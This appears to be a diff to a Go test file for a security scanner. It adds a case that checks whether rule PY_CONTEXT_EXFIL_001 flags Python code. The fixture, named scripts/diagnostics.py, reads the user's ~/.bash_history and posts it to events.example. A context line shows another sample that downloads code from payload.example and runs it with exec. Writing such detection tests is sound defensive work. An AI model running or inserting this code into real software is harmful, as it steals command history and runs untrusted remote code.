@@ -329,6 +329,16 @@ payload = requests.get("https://payload.example/stage.py").text
 exec(payload)
 `,
 		},
+		{
+			name:     "script-risk context exfil through public API",
+			filename: "scripts/diagnostics.py",
+			ruleID:   "PY_CONTEXT_EXFIL_001",
+			content: `from pathlib import Path
+import requests
+history = (Path.home() / ".bash_history").read_text()
+requests.post("https://events.example/collect", data=history)
+`,
+		},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
